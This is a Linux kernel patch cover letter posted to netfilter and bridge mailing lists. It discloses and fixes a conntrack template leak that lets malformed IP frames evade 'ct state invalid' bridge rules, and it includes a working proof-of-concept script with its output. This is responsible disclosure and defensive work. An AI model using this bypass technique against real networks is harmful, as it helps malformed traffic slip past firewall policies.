Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.remote-ip=209.85.215.172
ARC-Seal: i=1; d=subspace.kernel.org; s=arc20261015; a=rsa-sha256; cv=none;
	t=1795403454;
	b=KeBJ840jfQuQoqme9DB0k0dAYSv/Th/Gi48SB9pGkOsTp6yiacOlZ2B/g6my270zMsDI
	 /Sj31bHjpnkSpuy7KiOrI8LCyIdbZR8PxlLfDEzN8IePXJVXNzNN0todxYvZ9uOmtF65p
	 9c6+5B8eqNii8CxKeG9F90VAXNdEyP10GjwS+zEk50x99mfiMRBPHLqKiJEZsNUyhSnIM
	 ws3CghMYvMZYcTVs1p9YCwBlcK1M4tWERLH8ko02Ck1N1LT2CJi1yTrddvikZ+c1yWYqt
	 xTvaqDV54IXv9imcdef5rQQrmqxynQJN4gVi/S7gTouWfBOye7kN/MD6mytV7vkBsjA==
ARC-Message-Signature: i=1; d=subspace.kernel.org; s=arc20261015;
	a=rsa-sha256; c=relaxed/relaxed; t=1795403454;
	h=DMARC-Filter:Received:DKIM-Signature:X-Google-DKIM-Signature:
	 X-Forwarded-Encrypted:X-Gm-Message-State:X-Gm-Gg:X-Received:Received:
	 From:To:Cc:Subject:Date:Message-ID:X-Mailer:MIME-Version:
	 Content-Transfer-Encoding;
	bh=DL9wQ9wUjDZBY1XykMKvmcvfPUdxrtmOQvmRvrKNPSA=;
	b=DZuA06gDuWtGQCpeCHCgkq1nM79eW2HMgU15VHb7awFjjg1IKKIMuR5mvLE8PoGUTnoK
	 VUtTG33ODo4R0CNnVJPVU/aIIGXG5iBuOj1jxH1Gb3Ld6IiC0CBNt9jxtvL4uhfWGta+X
	 4DsGV1cGTOi7XyoJP8Wt2ZYii7qkjCa/gT3u4kmzgt2nqDXsVy39N+nP5JEFZGO4vaD9N
	 FRHrubDxTw8SE8TawUJOn7T5UrqUSqd4Qv8VvHDycdE5cfop4FjiYrDQsoeFA/faQFBep
	 oBxqjqsf6o7JkwHIJvaGh16qHwfLnZ/U0L36F6z9gTzbe4Pahsz3aOW/OnYnaPK5KAg==
ARC-Authentication-Results: i=1; smtp.subspace.kernel.org; 
	dmarc=pass header.from=nebusec.ai;
	spf=pass smtp.mailfrom=nebusec.ai;
	dkim=pass header.d=nebusec.ai header.i=@nebusec.ai header.a=rsa-sha256 header.s=google header.b=PTDter2e;
	arc=none smtp.remote-ip=209.85.215.172
Received: from mail-pg1-f172.google.com (mail-pg1-f172.google.com [209.85.215.172])
	(using TLSv1.3 with cipher TLS_AES_128_GCM_SHA256 (128/128 bits)
	 key-exchange X25519 server-signature ECDSA (prime256v1) server-digest SHA256)
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 32C10606A320
	for <bridge@lists.linux.dev>; Mon, 23 Nov 2026 03:10:53 +0000 (UTC)
DMARC-Filter: OpenDMARC Filter v1.4.2 smtp.subspace.kernel.org 32C10606A320
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.a=rsa-sha256 header.s=google header.b=PTDter2e
Received: by mail-pg1-f172.google.com with SMTP id 41be03b00d2f7-cdba1b5ed8dso1363652a12.1
        for <bridge@lists.linux.dev>; Sun, 22 Nov 2026 19:10:53 -0800 (PST)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=nebusec.ai; s=google; t=1795403452; x=1796008252; darn=lists.linux.dev;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
        bh=DL9wQ9wUjDZBY1XykMKvmcvfPUdxrtmOQvmRvrKNPSA=;
        b=PTDter2eTBZbUI8lUabrp71o15BdBsKO/slaoi8G/9TAsc48cpD1Dogn8A8oZfRnqc
         i9ROZYH59kY7tgCYg1AU8W/OTVLNg53RpbhoW4Np4n16oNxH6mUMnyAb8RJwnVKzsBxg
         umjX63SEYTirJqn2oGUQIrMIt9zQfWR7cZeJVc6P736Ark4K9WV6ntzCEEhz7qtxpi4d
         iTGjsIaa35DMQFrihjMeR7GHHGn9H7yYhZQ3D25YWogDA2bqk4MgcY/mEeyBDQLUbTw/
         f3exUSPSpwC6NhjH9gRTSPPjcuRkX/JtDbKFX0qiU1WVeuypJ0ZWrkRTahnqBXjCoy2W
         0zGA==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20260707; t=1795403452; x=1796008252;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=DL9wQ9wUjDZBY1XykMKvmcvfPUdxrtmOQvmRvrKNPSA=;
        b=LYEsGyROFjviL4u3XlgzII7MLv2W/fpEud1Q6qGCJAFNcFOuDaosaEWYU4GBrVaiIc
         AUJ4f+6G4elYNAPZ/fIf3tcVZPhuA5nV48sJhqkjzYEkTEjzZjPYr9D/aITQo577iHHy
         /IQXoUl0dvNNTgkWGWpd3GDDggkZIh10mM3d7coGSmW80hvAhCsuxn8IiFbzK8ObKiYv
         ddsgLTCqXXFxZyLy3VkU1kKlR4rB43gm77aEVAmsrKWpxhXB6xEqcGYu/rFfVBzBXiFh
         LR3Q897rrILrdrrhNipYCnUDe27AwjsFIZs3/Cr1J+Afz63HN8WR/v5/IxAXLbMpDSf3
         x4DQ==
X-Forwarded-Encrypted: i=1; AL+hErHFook7EZQ5Y1yC6BpTkOGejcm5QBeF3FnT7pDV1VKdT/PPrpCKZYFCk44DzrT8FHR986t+nPQ=@lists.linux.dev
X-Gm-Message-State: APuU4Z+td8wtNJImJmrpyNAxGpSeQhADmS3v/7e2c1SXcazEhugRuSRV
	rGFf1HgQXeKkAB8EGR5E4P0nWakl3ThQckcFXp+by7Gmi5xJM4ndV6ndFRV2lVxbYOSQQBcqB4o
	UUJ/UgoMI
X-Gm-Gg: AZFdTZfk/kd1VeNam7YiKOu/fsyw4NEj/EUXbEwlNO5GFuRu4hJYK9vCLq1Ucoj8FVr
	vp6JKODVciYj2bVsrk45cX1lxXCQo1Uct8ROJOfw2j3Aeai3LOt1/vJMwsvGv7tPXO9KPX5v8eg
	kahoqyrvp7hKa+gJnF6fSdoutuDADM0RaJFJXIaifmu2KKlkEevDuClIkIB/DcrgFZBpdlkhW5L
	F/TpZf/ioJIjOPZ6COXanctw44jHdouvkImNpSchRqL3njSUXBN3hgT8a9p+cpKC9ckJ7aBAS8X
	0XIgGIWxhcFY085KdmtSKsicP3hptlaw1Wj/nmMQxJny2HSHnmz6CY56BQZ6mXDu2HLvVB2X+Vl
	igzYVdCA+OkPtd3Fd3oo6zA/pr3nsOiPXuMHL0I5l7e+gue9zm/FBiYpA8MwJgYGqkYn2PacXJK
	PT57NH5LN6nTdz8AjK1bE2eFEFueg3VebEGsKLqoGNFWvsGlkp7WpJjAoK9TjSAUWCWNBI8cxT7
	Th4SNR0JWF9Z/6YghktNSTnbJyvpDJoeq0ojtM1Ut2A/F+u4Cl+7l1j3/GCfz4Wh8hsF/Sqaq8O
	/YgHoiJBvg5lCWuwBy2NdlUl+geaeSDZQ5jNn/Py
X-Received: by 2002:a05:6a21:4c0c:b0:3e1:4e53:4e7f with SMTP id adf61e73a8af0-4014dd5d533mr6695784637.27.1795403452239;
        Sun, 22 Nov 2026 19:10:52 -0800 (PST)
Received: from enjou-Legion-Y7000P-2019 ([191.223.218.36])
        by smtp.gmail.com with ESMTPSA id d2e1a72fcca58-8c87343fe6csm4826392b3a.37.2026.11.22.19.10.48
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Sun, 22 Nov 2026 19:10:51 -0800 (PST)
From: Ren Wei <weir@nebusec.ai>
To: netfilter-devel@vger.kernel.org,
	bridge@lists.linux.dev
Cc: pablo@netfilter.org,
	fw@strlen.de,
	phil@nwl.cc,
	razor@blackwall.org,
	idosch@nvidia.com,
	davem@davemloft.net,
	vega@nebusec.ai,
	sashiko-bot@kernel.org,
	rakukuip@gmail.com,
	weir@nebusec.ai
Subject: [PATCH nf 0/1] netfilter: bridge: detach conntrack template on invalid IP frames
Date: Mon, 23 Nov 2026 11:11:00 +0800
Message-ID: <cover.1795348417.git.rakukuip@gmail.com>
X-Mailer: git-send-email 2.53.0
X-Mailing-List: bridge@lists.linux.dev
List-Id: <bridge.lists.linux.dev>
List-Post: <mailto:bridge@lists.linux.dev>
List-Help: <mailto:bridge+help@lists.linux.dev>
List-Subscribe: <mailto:bridge+subscribe@lists.linux.dev>
List-Unsubscribe: <mailto:bridge+unsubscribe@lists.linux.dev>
List-Owner: <mailto:bridge+owner@lists.linux.dev>
Precedence: list
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit

From: Luxiao Xu <rakukuip@gmail.com>

Hi Linux kernel maintainers,

We found and validated an issue in
net/bridge/netfilter/nf_conntrack_bridge.c where malformed IPv4 and IPv6
frames retain an attached conntrack template on early rejection paths in
nf_ct_bridge_pre().

This bug is tracked at: https://bugtracker.nebusec.ai/f/11085

Reachability & impact:
When a bridge policy assigns a conntrack zone before connection tracking
(for example via nftables `ct zone set` at raw priority -300), nftables
attaches a conntrack template with IP_CT_NEW to skb->_nfct. If an
incoming ETH_P_IP or ETH_P_IPV6 frame fails header pull, length
trimming, or header validation in nf_ct_bridge_pre(), nf_ct_bridge_pre()
returns NF_ACCEPT directly without passing the skb to nf_conntrack_in().

Because nft_ct_get_eval() evaluates NFT_CT_STATE before checking
nf_ct_is_template(ct), the retained IP_CT_NEW template causes malformed,
truncated, or wrong-version IP frames to match `ct state new` instead of
`ct state invalid`. Bridge policies that accept NEW traffic and intend to
drop INVALID traffic can consequently forward malformed frames.

Note on related nf-next work:
Florian Westphal's nf-next proposal "netfilter: conntrack: add and use
nf_ct_get_real()" (see link below) would prevent downstream consumers
such as nft_ct_get_eval() from classifying a retained template as NEW,
treating it as INVALID instead. Because nf_ct_get_real() is not in nf or
-stable kernels, and because nf_ct_bridge_pre() should not leave an
unconsumed template attached to skb->_nfct on parse failure (matching
nf_conntrack_in() and the default non-IP branch), releasing the template
in nf_ct_bridge_pre() remains necessary.
https://lore.kernel.org/netfilter-devel/20260923122741.30468-1-fw@strlen.de/

The attached reproducer (poc.sh) uses a netdev ingress rule on vethA to
rewrite the IPv4 version nibble from 0x45 to 0x65 (running as root in
our guest environment); an external or bridge peer can also inject
malformed frames directly over the wire without host privileges.

=== details below ===

Bug details:

In net/bridge/netfilter/nf_conntrack_bridge.c, nf_ct_bridge_pre() has
six early-return paths across the ETH_P_IP and ETH_P_IPV6 cases:
1. ETH_P_IP:
   - !pskb_may_pull(skb, sizeof(struct iphdr))
   - pskb_trim_rcsum(skb, len)
   - nf_ct_br_ip_check(skb)
2. ETH_P_IPV6:
   - !pskb_may_pull(skb, sizeof(struct ipv6hdr))
   - pskb_trim_rcsum(skb, len)
   - nf_ct_br_ipv6_check(skb)

Unlike the default non-IP branch (which calls nf_reset_ct(skb)) and
nf_conntrack_in() (which clears skb->_nfct = 0 and drops the template
reference on parse failure), all six IPv4/IPv6 rejection paths return
NF_ACCEPT with the template still attached to skb->_nfct.

The fix jumps all six paths to a shared `invalid:` label that calls
nf_reset_ct(skb) before returning NF_ACCEPT, dropping the template
reference and restoring skb->_nfct to 0 so that subsequent ct state
evaluation classifies the frame as INVALID.

Testing & Validation:
We validated both the baseline reproduction and the fix in an x86_64
QEMU guest (2 vCPUs, 2GB RAM, CONFIG_KASAN=y, CONFIG_UBSAN=y,
CONFIG_LOCKDEP=y, CONFIG_NF_CONNTRACK_BRIDGE=y) built from nf/main
(734bef548a96).

1. Pre-fix verification (unpatched nf/main):
   Running `bash /home/test_user/poc.sh`:
   - [control-no-template]: seen=1, invalid=1, newpkts=0, mangled=1
   - [template-retained]:   seen=1, invalid=0, newpkts=1, mangled=1

2. Post-fix verification (patched kernel):
   Running `bash /root/poc.sh`:
   - [control-no-template]: seen=1, invalid=1, newpkts=0, mangled=1
   - [template-retained]:   seen=1, invalid=1, newpkts=0, mangled=1

3. Extended regression testing (with `ct zone set 1` active):
   - IPv4 short header (< 20B), inflated tot_len, tot_len < ihl*4,
     low IHL (0x44), wrong version (0x65): all matched invalid=1, new=0.
   - IPv6 short header (< 40B), wrong version (0x40), inflated
     payload_len: all matched invalid=1, new=0.
   - Non-IP ARP frame: matched untracked=1, invalid=0, new=0.
   - Normal IPv4 ping and IPv6 ping6 across bridge (between init_net
     and netns nsB): both succeeded with invalid=0, new=1,
     established=1.
   - 1000-packet malformed IPv4/IPv6 stress test: invalid=1000, new=0,
     with zero KASAN, UBSAN, Lockdep, or refcount warnings in dmesg.

4. Style & patch checks:
   - git diff --check HEAD~1: 0 issues
   - git apply --check on nf/main: clean
   - scripts/checkpatch.pl --strict: 0 errors, 1 warning (consecutive
     Reported-by lines where VEGA has no separate public report URL)

Reproducer:

    bash poc.sh

=== BEGIN poc.sh ===
#!/bin/bash
set -euo pipefail

PATH=/usr/sbin:/sbin:/usr/bin:/bin

TABLE=brtest
BR=br0
PORT_A=vethA
PORT_B=vethB
END_A=peerA
END_B=peerB
TARGET_IP=10.0.0.99
SOURCE_IP=10.0.0.1/24

cleanup() {
	nft flush ruleset >/dev/null 2>&1 || true
	ip route del "$TARGET_IP/32" dev "$END_A" >/dev/null 2>&1 || true
	ip neigh del "$TARGET_IP" dev "$END_A" >/dev/null 2>&1 || true
	ip link del "$PORT_A" >/dev/null 2>&1 || true
	ip link del "$PORT_B" >/dev/null 2>&1 || true
	ip link del "$BR" >/dev/null 2>&1 || true
}

need_root() {
	if [ "$(id -u)" -ne 0 ]; then
		echo "run as root, or use --userns from an unprivileged account" >&2
		exit 1
	fi
}

mac_of() {
	ip -o link show dev "$1" | awk '{for (i = 1; i <= NF; i++) if ($i == "link/ether") print $(i + 1)}'
}

setup_topology() {
	ip link add "$BR" type bridge
	ip link add "$PORT_A" type veth peer name "$END_A"
	ip link add "$PORT_B" type veth peer name "$END_B"
	ip link set "$PORT_A" master "$BR"
	ip link set "$PORT_B" master "$BR"

	for dev in "$BR" "$PORT_A" "$PORT_B" "$END_A" "$END_B"; do
		ip link set "$dev" up
	done

	ip addr add "$SOURCE_IP" dev "$END_A"
	ip route add "$TARGET_IP/32" dev "$END_A"
	ip neigh add "$TARGET_IP" lladdr "$(mac_of "$END_B")" dev "$END_A" nud permanent
}

setup_mangler() {
	nft add table netdev m
	nft add counter netdev m mangled
	nft 'add chain netdev m ingress_vethA { type filter hook ingress device "vethA" priority 0; policy accept; }'
	nft add rule netdev m ingress_vethA meta protocol ip counter name mangled @nh,0,8 set 0x65
}

setup_observer() {
	nft add table bridge "$TABLE"
	for c in seen invalid newpkts established untracked other; do
		nft add counter bridge "$TABLE" "$c"
	done

	nft 'add chain bridge brtest observe { type filter hook prerouting priority 0; policy accept; }'
	nft add rule bridge "$TABLE" observe iifname "$PORT_A" meta protocol ip counter name seen
	nft add rule bridge "$TABLE" observe iifname "$PORT_A" meta protocol ip ct state invalid counter name invalid accept
	nft add rule bridge "$TABLE" observe iifname "$PORT_A" meta protocol ip ct state untracked counter name untracked accept
	nft add rule bridge "$TABLE" observe iifname "$PORT_A" meta protocol ip ct state new counter name newpkts accept
	nft add rule bridge "$TABLE" observe iifname "$PORT_A" meta protocol ip ct state established,related counter name established accept
	nft add rule bridge "$TABLE" observe iifname "$PORT_A" meta protocol ip counter name other
}

add_zone_template_rule() {
	nft 'add chain bridge brtest ctpre { type filter hook prerouting priority -300; policy accept; }'
	nft add rule bridge "$TABLE" ctpre iifname "$PORT_A" meta protocol ip ct zone set 1
}

reset_phase_counters() {
	nft reset counters table bridge "$TABLE"
	nft reset counters table netdev m
}

print_phase_counters() {
	echo "bridge counters:"
	nft list counters table bridge "$TABLE"
	echo "mangle counters:"
	nft list counters table netdev m
}

run_phase() {
	local label=$1

	echo "[$label] sending one ping after mangling the first IPv4 header byte to 0x65"
	ping -I "$END_A" -c 1 -W 1 "$TARGET_IP" >/dev/null || true
	echo "[$label] results"
	print_phase_counters
}

main_inner() {
	need_root
	trap cleanup EXIT
	cleanup

	setup_topology
	setup_observer
	setup_mangler

	run_phase "control-no-template"

	add_zone_template_rule
	reset_phase_counters
	run_phase "template-retained"
}

if [ "${1:-}" = "--userns" ]; then
	exec unshare -Urnm -- "$0" --inner
fi

if [ "${1:-}" = "--inner" ]; then
	shift
fi

main_inner "$@"
=== END poc.sh ===

=== BEGIN pre-fix output ===
[control-no-template] sending one ping after mangling the first IPv4 header byte to 0x65
[control-no-template] results
bridge counters:
table bridge brtest {
	counter seen {
		packets 1 bytes 84
	}
	counter invalid {
		packets 1 bytes 84
	}
	counter newpkts {
		packets 0 bytes 0
	}
	counter established {
		packets 0 bytes 0
	}
	counter untracked {
		packets 0 bytes 0
	}
	counter other {
		packets 0 bytes 0
	}
}
mangle counters:
table netdev m {
	counter mangled {
		packets 1 bytes 84
	}
}
[template-retained] sending one ping after mangling the first IPv4 header byte to 0x65
[template-retained] results
bridge counters:
table bridge brtest {
	counter seen {
		packets 1 bytes 84
	}
	counter invalid {
		packets 0 bytes 0
	}
	counter newpkts {
		packets 1 bytes 84
	}
	counter established {
		packets 0 bytes 0
	}
	counter untracked {
		packets 0 bytes 0
	}
	counter other {
		packets 0 bytes 0
	}
}
mangle counters:
table netdev m {
	counter mangled {
		packets 1 bytes 84
	}
}
=== END pre-fix output ===

=== BEGIN post-fix output ===
[control-no-template] sending one ping after mangling the first IPv4 header byte to 0x65
[control-no-template] results
bridge counters:
table bridge brtest {
	counter seen {
		packets 1 bytes 84
	}
	counter invalid {
		packets 1 bytes 84
	}
	counter newpkts {
		packets 0 bytes 0
	}
	counter established {
		packets 0 bytes 0
	}
	counter untracked {
		packets 0 bytes 0
	}
	counter other {
		packets 0 bytes 0
	}
}
mangle counters:
table netdev m {
	counter mangled {
		packets 1 bytes 84
	}
}
[template-retained] sending one ping after mangling the first IPv4 header byte to 0x65
[template-retained] results
bridge counters:
table bridge brtest {
	counter seen {
		packets 1 bytes 84
	}
	counter invalid {
		packets 1 bytes 84
	}
	counter newpkts {
		packets 0 bytes 0
	}
	counter established {
		packets 0 bytes 0
	}
	counter untracked {
		packets 0 bytes 0
	}
	counter other {
		packets 0 bytes 0
	}
}
mangle counters:
table netdev m {
	counter mangled {
		packets 1 bytes 84
	}
}
=== END post-fix output ===

Best regards,
Luxiao Xu

Luxiao Xu (1):
  netfilter: bridge: detach conntrack template on invalid IP frames

 net/bridge/netfilter/nf_conntrack_bridge.c | 16 ++++++++++------
 1 file changed, 10 insertions(+), 6 deletions(-)

-- 
2.43.0

